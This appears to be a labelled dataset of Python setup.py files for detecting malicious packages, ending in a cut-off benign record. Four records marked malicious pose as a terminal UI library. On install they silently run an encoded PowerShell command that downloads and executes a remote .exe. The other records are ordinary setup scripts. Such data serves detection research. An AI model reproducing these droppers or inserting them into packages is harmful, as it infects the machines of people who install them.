{"idx": "piplib-10.66", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'piplib',\n    packages = ['modlib'],\n    version = '10.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqstringpepcv-3.36", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringpepcv',\n    packages = ['modlib'],\n    version = '8.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-intelcpusuper-6.44", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intelcpusuper',\n    packages = ['modlib'],\n    version = '5.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqintelreplacepull-6.8", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintelreplacepull',\n    packages = ['modlib'],\n    version = '4.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-bootstrap4-22.2", "func": "import pathlib\n\nfrom setuptools import find_packages, setup\n\n# The directory containing this file\nHERE = pathlib.Path(__file__).parent\n\n# The text of the README file\nREADME = (HERE / \"README.md\").read_text()\n\n\n# This call to setup() does all the work\nsetup(\n    name=\"django-bootstrap4\",\n    zip_safe=False,\n    version=\"22.2\",\n    description=\"Bootstrap 4 for Django\",\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/zostera/django-bootstrap4\",\n    author=\"Dylan Verheul\",\n    author_email=\"dylan@dyve.net\",\n    license=\"BSD-3-Clause\",\n    packages=find_packages(where=\"src\"),\n    package_dir={\"\": \"src\"},\n    include_package_data=True,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Framework :: Django :: 4.1\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Utilities\",\n    ],\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"Django>=3.2\",\n        \"beautifulsoup4>=4.8.0\",\n        'importlib-metadata<3; python_version<\"3.8\"',\n    ],\n)\n", "target": 0}
{"idx": "flake8-builtins-1.5.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\n\nshort_description = \\\n    'Check for python builtins being used as variables or parameters.'\n\n\nlong_description = '{0}\\n{1}'.format(\n    open('README.rst').read(),\n    open('CHANGES.rst').read(),\n)\n\n\nsetup(\n    name='flake8-builtins',\n    version='1.5.3',\n    description=short_description,\n    long_description=long_description,\n    # Get more from https://pypi.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: GNU General Public License v2 (GPLv2)',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Quality Assurance',\n    ],\n    keywords='pep8 flake8 python',\n    author='Gil Forcada',\n    author_email='gil.gnome@gmail.com',\n    url='https://github.com/gforcada/flake8-builtins',\n    license='GPL version 2',\n    py_modules=['flake8_builtins'],\n    include_package_data=True,\n    test_suite='run_tests',\n    zip_safe=False,\n    install_requires=[\n        'flake8',\n    ],\n    extras_require={\n        'test': [\n            'coverage',\n            'coveralls',\n            'mock',\n            'pytest',\n            'pytest-cov',\n        ],\n    },\n    entry_points={\n        'flake8.extension': ['A00 = flake8_builtins:BuiltinsChecker'],\n    },\n)\n", "target": 0}
{"idx": "dipy-1.5.0", "func": "#!/usr/bin/env python\n\"\"\" Installation script for dipy package \"\"\"\n\nimport os\nimport sys\nimport platform\nfrom copy import deepcopy\nfrom os.path import join as pjoin, dirname, exists\nfrom glob import glob\n\n# BEFORE importing setuptools, remove MANIFEST. setuptools doesn't properly\n# update it when the contents of directories change.\nif exists('MANIFEST'):\n    os.remove('MANIFEST')\n\n# force_setuptools can be set from the setup_egg.py script\nif 'force_setuptools' not in globals():\n    # For some commands, always use setuptools\n    if len(set(('develop', 'bdist_egg', 'bdist_rpm', 'bdist', 'bdist_dumb',\n                'bdist_mpkg', 'bdist_wheel', 'install_egg_info', 'egg_info',\n                'easy_install')).intersection(sys.argv)) > 0:\n        force_setuptools = True\n    else:\n        force_setuptools = False\n\nif force_setuptools:\n    import setuptools\n\n# Import setuptools _after_ potential setuptools import above, and after\n# removing MANIFEST\nfrom setuptools import setup\nfrom setuptools.extension import Extension\n\nfrom cythexts import cyproc_exts, get_pyx_sdist\nfrom setup_helpers import (install_scripts_bat, add_flag_checking,\n                           SetupDependency, read_vars_from,\n                           make_np_ext_builder)\nfrom version_helpers import get_comrec_build\n\n# Get version and release info, which is all stored in dipy/info.py\ninfo = read_vars_from(pjoin('dipy', 'info.py'))\n\n# We may just have imported setuptools, or we may have been exec'd from a\n# setuptools environment like pip\nusing_setuptools = 'setuptools' in sys.modules\nextra_setuptools_args = {}\nif using_setuptools:\n    # Try to preempt setuptools monkeypatching of Extension handling when Pyrex\n    # is missing.  Otherwise the monkeypatched Extension will change .pyx\n    # filenames to .c filenames, and we probably don't have the .c files.\n    sys.path.insert(0, pjoin(dirname(__file__), 'fake_pyrex'))\n    # Set setuptools extra arguments\n    extra_setuptools_args = dict(\n        tests_require=['pytest'],\n        zip_safe=False,\n        extras_require=info.EXTRAS_REQUIRE,\n        python_requires=\">= 3.6\",\n        )\n\n# Define extensions\nEXTS = []\n\n# We use some defs from npymath, but we don't want to link against npymath lib\next_kwargs = {\n    'include_dirs': ['src'],  # We add np.get_include() later\n    'define_macros': [(\"NPY_NO_DEPRECATED_API\", \"NPY_1_7_API_VERSION\")]\n    }\n\nfor modulename, other_sources, language in (\n        ('dipy.core.interpolation', [], 'c'),\n        ('dipy.direction.pmf', [], 'c'),\n        ('dipy.direction.probabilistic_direction_getter', [], 'c'),\n        ('dipy.direction.closest_peak_direction_getter', [], 'c'),\n        ('dipy.direction.bootstrap_direction_getter', [], 'c'),\n        ('dipy.reconst.eudx_direction_getter', [], 'c'),\n        ('dipy.reconst.recspeed', [], 'c'),\n        ('dipy.reconst.vec_val_sum', [], 'c'),\n        ('dipy.reconst.quick_squash', [], 'c'),\n        ('dipy.tracking.distances', [], 'c'),\n        ('dipy.tracking.streamlinespeed', [], 'c'),\n        ('dipy.tracking.localtrack', [], 'c'),\n        ('dipy.tracking.direction_getter', [], 'c'),\n        ('dipy.tracking.stopping_criterion', [], 'c'),\n        ('dipy.tracking.vox2track', [], 'c'),\n        ('dipy.tracking.propspeed', [], 'c'),\n        ('dipy.tracking.fbcmeasures', [], 'c'),\n        ('dipy.segment.cythonutils', [], 'c'),\n        ('dipy.segment.featurespeed', [], 'c'),\n        ('dipy.segment.metricspeed', [], 'c'),\n        ('dipy.segment.clusteringspeed', [], 'c'),\n        ('dipy.segment.clustering_algorithms', [], 'c'),\n        ('dipy.segment.mrf', [], 'c'),\n        ('dipy.denoise.denspeed', [], 'c'),\n        ('dipy.denoise.pca_noise_estimate', [], 'c'),\n        ('dipy.denoise.nlmeans_block', [], 'c'),\n        ('dipy.denoise.enhancement_kernel', [], 'c'),\n        ('dipy.denoise.shift_twist_convolution', [], 'c'),\n        ('dipy.align.vector_fields', [], 'c'),\n        ('dipy.align.sumsqdiff', [], 'c'),\n        ('dipy.align.expectmax', [], 'c'),\n        ('dipy.align.crosscorr', [], 'c'),\n        ('dipy.align.bundlemin', [], 'c'),\n        ('dipy.align.transforms', [], 'c'),\n        ('dipy.align.parzenhist', [], 'c'),\n        ('dipy.utils.omp', [], 'c'),\n        ('dipy.utils.fast_numpy', [], 'c')):\n    pyx_src = pjoin(*modulename.split('.')) + '.pyx'\n    EXTS.append(Extension(modulename, [pyx_src] + other_sources,\n                          language=language,\n                          **deepcopy(ext_kwargs)))  # deepcopy lists\n\n# Do our own build and install time dependency checking. setup.py gets called\n# in many different ways, and may be called just to collect information\n# (egg_info). We need to set up tripwires to raise errors when actually doing\n# things, like building, rather than unconditionally in the setup.py import or\n# exec We may make tripwire versions of build_ext, build_py, install\nneed_cython = True\npybuilder = get_comrec_build('dipy')\n# Cython is a dependency for building extensions, iff we don't have stamped\n# up pyx and c files.\nbuild_ext, need_cython = cyproc_exts(EXTS,\n                                     info.CYTHON_MIN_VERSION,\n                                     'pyx-stamps')\n# Add openmp flags if they work\nsimple_test_c = \"\"\"int main(int argc, char** argv) { return(0); }\"\"\"\nomp_test_c = \"\"\"#include <omp.h>\nint main(int argc, char** argv) { return(0); }\"\"\"\n\nmsc_flag_defines = [[['/openmp'], [], omp_test_c, 'HAVE_VC_OPENMP'],\n                    ]\ngcc_flag_defines = [[['-msse2', '-mfpmath=sse'], [], simple_test_c, 'USING_GCC_SSE2'],\n                    ]\n\nif 'clang' not in platform.python_compiler().lower():\n    gcc_flag_defines += [[['-fopenmp'], ['-fopenmp'], omp_test_c, 'HAVE_OPENMP'], ]\n\n# Test if it is a 32 bits version\nif not sys.maxsize > 2 ** 32:\n    # This flag is needed only on 32 bits\n    msc_flag_defines += [[['/arch:SSE2'], [], simple_test_c, 'USING_VC_SSE2'], ]\n\nflag_defines = msc_flag_defines if 'msc' in platform.python_compiler().lower() else gcc_flag_defines\n\nextbuilder = add_flag_checking(build_ext, flag_defines, 'dipy')\n\n# Use ext builder to add np.get_include() at build time, not during setup.py\n# execution.\nextbuilder = make_np_ext_builder(extbuilder)\nif need_cython:\n    SetupDependency('Cython', info.CYTHON_MIN_VERSION,\n                    req_type='install_requires',\n                    heavy=True).check_fill(extra_setuptools_args)\nSetupDependency('numpy', info.NUMPY_MIN_VERSION,\n                req_type='install_requires',\n                heavy=True).check_fill(extra_setuptools_args)\nSetupDependency('scipy', info.SCIPY_MIN_VERSION,\n                req_type='install_requires',\n                heavy=True).check_fill(extra_setuptools_args)\nSetupDependency('nibabel', info.NIBABEL_MIN_VERSION,\n                req_type='install_requires',\n                heavy=False).check_fill(extra_setuptools_args)\nSetupDependency('h5py', info.H5PY_MIN_VERSION,\n                req_type='install_requires',\n                heavy=False).check_fill(extra_setuptools_args)\nSetupDependency('tqdm', info.TQDM_MIN_VERSION,\n                req_type='install_requires',\n                heavy=False).check_fill(extra_setuptools_args)\n\ncmdclass = dict(\n    build_py=pybuilder,\n    build_ext=extbuilder,\n    install_scripts=install_scripts_bat,\n    sdist=get_pyx_sdist(include_dirs=['src']))\n\n\ndef main(**extra_args):\n    setup(name=info.NAME,\n          maintainer=info.MAINTAINER,\n          maintainer_email=info.MAINTAINER_EMAIL,\n          description=info.DESCRIPTION,\n          long_description=info.LONG_DESCRIPTION,\n          url=info.URL,\n          download_url=info.DOWNLOAD_URL,\n          license=info.LICENSE,\n          classifiers=info.CLASSIFIERS,\n          author=info.AUTHOR,\n          author_email=info.AUTHOR_EMAIL,\n          platforms=info.PLATFORMS,\n          version=info.VERSION,\n          requires=info.REQUIRES,\n          provides=info.PROVIDES,\n          packages=['dipy',\n                    'dipy.tests',\n                    'dipy.align',\n                    'dipy.align.tests',\n                    'dipy.core',\n                    'dipy.core.tests',\n                    'dipy.direction',\n                    'dipy.direction.tests',\n                    'dipy.tracking',\n                    'dipy.tracking.tests',\n                    'dipy.tracking.benchmarks',\n                    'dipy.reconst',\n                    'dipy.reconst.benchmarks',\n                    'dipy.reconst.tests',\n                    'dipy.io',\n                    'dipy.io.tests',\n                    'dipy.viz',\n                    'dipy.viz.tests',\n                    'dipy.testing',\n                    'dipy.testing.tests',\n                    'dipy.boots',\n                    'dipy.data',\n                    'dipy.data.tests',\n                    'dipy.utils',\n                    'dipy.utils.tests',\n                    'dipy.segment',\n                    'dipy.segment.benchmarks',\n                    'dipy.segment.tests',\n                    'dipy.sims',\n                    'dipy.sims.tests',\n                    'dipy.stats',\n                    'dipy.stats.tests',\n                    'dipy.denoise',\n                    'dipy.denoise.tests',\n                    'dipy.workflows',\n                    'dipy.workflows.tests',\n                    'dipy.nn',\n                    'dipy.nn.tests'],\n\n          ext_modules=EXTS,\n          package_data={'dipy': [pjoin('data', 'files', '*')],\n                        },\n          data_files=[('share/doc/dipy/examples',\n                       glob(pjoin('doc', 'examples', '*.py')))],\n          scripts=glob(pjoin('bin', 'dipy_*')),\n          cmdclass=cmdclass,\n          **extra_args\n          )\n\n\n# simple way to test what setup will do\n# python setup.py install --prefix=/tmp\nif __name__ == \"__main__\":\n    main(**extra_setuptools_args)\n", "target": 0}
{"idx": "Delorean-1.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nfrom version import __version__\n\ndependencies = [\n    'babel>=2.1.1',\n    'humanize>=0.5.1',\n    'python-dateutil>=2.4.2',\n    'pytz>=2015.7',\n    'tzlocal>=1.2']\n\nsetup(\n    name='Delorean',\n    version='.'.join(str(x) for x in __version__),\n    description='library for manipulating datetimes with ease and clarity',\n    url='https://github.com/myusuf3/delorean',\n    author='Mahdi Yusuf',\n    author_email=\"yusuf.mahdi@gmail.com\",\n    packages=[\n    'delorean',\n    ],\n    license='MIT license',\n    install_requires=dependencies,\n    test_suite = 'tests.test_data',\n    long_description=open('README.rst').read(),\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.1',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n", "target": 0}
{"idx": "flake8-annotations-2.9.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_annotations']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['attrs>=21.4', 'flake8>=3.7']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['typed-ast>=1.4,<2.0']}\n\nentry_points = \\\n{'flake8.extension': ['ANN = flake8_annotations.checker:TypeHintChecker']}\n\nsetup_kwargs = {\n    'name': 'flake8-annotations',\n    'version': '2.9.1',\n    'description': 'Flake8 Type Annotation Checks',\n    'long_description': '# flake8-annotations\\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/flake8-annotations)](https://pypi.org/project/flake8-annotations/)\\n[![PyPI](https://img.shields.io/pypi/v/flake8-annotations)](https://pypi.org/project/flake8-annotations/)\\n[![PyPI - License](https://img.shields.io/pypi/l/flake8-annotations?color=magenta)](https://github.com/sco1/flake8-annotations/blob/master/LICENSE)\\n[![pre-commit.ci status](https://results.pre-commit.ci/badge/github/sco1/flake8-annotations/main.svg)](https://results.pre-commit.ci/latest/github/sco1/flake8-annotations/main)\\n[![Code style: black](https://img.shields.io/badge/code%20style-black-black)](https://github.com/psf/black)\\n[![Open in Visual Studio Code](https://img.shields.io/badge/Open%20in-VSCode.dev-blue)](https://vscode.dev/github.com/sco1/flake8-annotations)\\n\\n`flake8-annotations` is a plugin for [Flake8](http://flake8.pycqa.org/en/latest/) that detects the absence of [PEP 3107-style](https://www.python.org/dev/peps/pep-3107/) function annotations and [PEP 484-style](https://www.python.org/dev/peps/pep-0484/#type-comments) type comments (see: [Caveats](#Caveats-for-PEP-484-style-Type-Comments)).\\n\\nWhat this won\\'t do: Check variable annotations (see: [PEP 526](https://www.python.org/dev/peps/pep-0526/)), respect stub files, or replace [mypy](http://mypy-lang.org/).\\n\\n## Installation\\nInstall from PyPi with your favorite `pip` invocation:\\n\\n```bash\\n$ pip install flake8-annotations\\n```\\n\\nIt will then be run automatically as part of flake8.\\n\\nYou can verify it\\'s being picked up by invoking the following in your shell:\\n\\n\\n<!-- [[[cog\\nimport cog\\nfrom subprocess import PIPE, run\\nout = run([\"flake8\", \"--version\"], stdout=PIPE, encoding=\"ascii\")\\nver_str = out.stdout.replace(\"\\\\n\", \"\")\\ncog.out(\\n    f\"```bash\\\\n$ flake8 --version\\\\n{ver_str}\\\\n```\"\\n)\\n]]] -->\\n```bash\\n$ flake8 --version\\n5.0.2 (flake8-annotations: 2.9.1, mccabe: 0.7.0, pycodestyle: 2.9.0, pyflakes:2.5.0) CPython 3.10.5 on Darwin\\n```\\n<!-- [[[end]]] -->\\n\\n## Table of Warnings\\nWith the exception of `ANN4xx`-level warnings, all warnings are enabled by default.\\n\\n### Function Annotations\\n| ID       | Description                                   |\\n|----------|-----------------------------------------------|\\n| `ANN001` | Missing type annotation for function argument |\\n| `ANN002` | Missing type annotation for `*args`           |\\n| `ANN003` | Missing type annotation for `**kwargs`        |\\n\\n### Method Annotations\\n| ID       | Description                                                  |\\n|----------|--------------------------------------------------------------|\\n| `ANN101` | Missing type annotation for `self` in method<sup>1</sup>     |\\n| `ANN102` | Missing type annotation for `cls` in classmethod<sup>1</sup> |\\n\\n### Return Annotations\\n| ID       | Description                                           |\\n|----------|-------------------------------------------------------|\\n| `ANN201` | Missing return type annotation for public function    |\\n| `ANN202` | Missing return type annotation for protected function |\\n| `ANN203` | Missing return type annotation for secret function    |\\n| `ANN204` | Missing return type annotation for special method     |\\n| `ANN205` | Missing return type annotation for staticmethod       |\\n| `ANN206` | Missing return type annotation for classmethod        |\\n\\n### Type Comments\\n**Deprecation notice**: Support for type comments will be removed in `3.0`. See [this issue](https://github.com/sco1/flake8-annotations/issues/95) for more information.\\n| ID       | Description                                               |\\n|----------|-----------------------------------------------------------|\\n| `ANN301` | PEP 484 disallows both type annotations and type comments |\\n\\n### Opinionated Warnings\\nThese warnings are disabled by default.\\n| ID       | Description                                                |\\n|----------|------------------------------------------------------------|\\n| `ANN401` | Dynamically typed expressions (typing.Any) are disallowed.<sup>2</sup> |\\n\\n**Notes:**\\n1. See: [PEP 484](https://www.python.org/dev/peps/pep-0484/#annotating-instance-and-class-methods) and [PEP 563](https://www.python.org/dev/peps/pep-0563/) for suggestions on annotating `self` and `cls` arguments.\\n2. See: [Dynamic Typing Caveats](#dynamic-typing-caveats)\\n\\n## Configuration Options\\nSome opinionated flags are provided to tailor the linting errors emitted.\\n\\n### `--suppress-none-returning`: `bool`\\nSuppress `ANN200`-level errors for functions that meet one of the following criteria:\\n  * Contain no `return` statement, or\\n  * Explicit `return` statement(s) all return `None` (explicitly or implicitly).\\n\\nDefault: `False`\\n\\n### `--suppress-dummy-args`: `bool`\\nSuppress `ANN000`-level errors for dummy arguments, defined as `_`.\\n\\nDefault: `False`\\n\\n### `--allow-untyped-defs`: `bool`\\nSuppress all errors for dynamically typed functions. A function is considered dynamically typed if it does not contain any type hints.\\n\\nDefault: `False`\\n\\n### `--allow-untyped-nested`: `bool`\\nSuppress all errors for dynamically typed nested functions. A function is considered dynamically typed if it does not contain any type hints.\\n\\nDefault: `False`\\n\\n### `--mypy-init-return`: `bool`\\nAllow omission of a return type hint for `__init__` if at least one argument is annotated. See [mypy\\'s documentation](https://mypy.readthedocs.io/en/stable/class_basics.html?#annotating-init-methods) for additional details.\\n\\nDefault: `False`\\n\\n### `--dispatch-decorators`: `list[str]`\\nComma-separated list of decorators flake8-annotations should consider as dispatch decorators. Linting errors are suppressed for functions decorated with at least one of these functions.\\n\\nDecorators are matched based on their attribute name. For example, `\"singledispatch\"` will match any of the following:\\n  * `import functools; @functools.singledispatch`\\n  * `import functools as <alias>; @<alias>.singledispatch`\\n  * `from functools import singledispatch; @singledispatch`\\n\\n**NOTE:** Deeper imports, such as `a.b.singledispatch` are not supported.\\n\\nSee: [Generic Functions](#generic-functions) for additional information.\\n\\nDefault: `\"singledispatch, singledispatchmethod\"`\\n\\n### `--overload-decorators`: `list[str]`\\nComma-separated list of decorators flake8-annotations should consider as [`typing.overload`](https://docs.python.org/3/library/typing.html#typing.overload) decorators.\\n\\nDecorators are matched based on their attribute name. For example, `\"overload\"` will match any of the following:\\n  * `import typing; @typing.overload`\\n  * `import typing as <alias>; @<alias>.overload`\\n  * `from typing import overload; @overload`\\n\\n**NOTE:** Deeper imports, such as `a.b.overload` are not supported.\\n\\nSee: [The `typing.overload` Decorator](#the-typingoverload-decorator) for additional information.\\n\\nDefault: `\"overload\"`\\n\\n### `--allow-star-arg-any`\\nSuppress `ANN401` for dynamically typed `*args` and `**kwargs`.\\n\\nDefault: `False`\\n\\n## Generic Functions\\nPer the Python Glossary, a [generic function](https://docs.python.org/3/glossary.html#term-generic-function) is defined as:\\n\\n> A function composed of multiple functions implementing the same operation for different types. Which implementation should be used during a call is determined by the dispatch algorithm.\\n\\nIn the standard library we have some examples of decorators for implementing these generic functions: [`functools.singledispatch`](https://docs.python.org/3/library/functools.html#functools.singledispatch) and [`functools.singledispatchmethod`](https://docs.python.org/3/library/functools.html#functools.singledispatchmethod). In the spirit of the purpose of these decorators, errors for missing annotations for functions decorated with at least one of these are ignored.\\n\\nFor example, this code:\\n\\n```py\\nimport functools\\n\\n@functools.singledispatch\\ndef foo(a):\\n    print(a)\\n\\n@foo.register\\ndef _(a: list) -> None:\\n    for idx, thing in enumerate(a):\\n        print(idx, thing)\\n```\\n\\nWill not raise any linting errors for `foo`.\\n\\nDecorator(s) to treat as defining generic functions may be specified by the [`--dispatch-decorators`](#--dispatch-decorators-liststr) configuration option.\\n\\n## The `typing.overload` Decorator\\nPer the [`typing`](https://docs.python.org/3/library/typing.html#typing.overload) documentation:\\n\\n> The `@overload` decorator allows describing functions and methods that support multiple different combinations of argument types. A series of `@overload`-decorated definitions must be followed by exactly one non-`@overload`-decorated definition (for the same function/method).\\n\\nIn the spirit of the purpose of this decorator, errors for missing annotations for non-`@overload`-decorated functions are ignored if they meet this criteria.\\n\\nFor example, this code:\\n\\n```py\\nimport typing\\n\\n\\n@typing.overload\\ndef foo(a: int) -> int:\\n    ...\\n\\ndef foo(a):\\n    ...\\n```\\n\\nWill not raise linting errors for missing annotations for the arguments & return of the non-decorated `foo` definition.\\n\\nDecorator(s) to treat as `typing.overload` may be specified by the [`--overload-decorators`](#--overload-decorators-liststr) configuration option.\\n\\n## Caveats for PEP 484-style Type 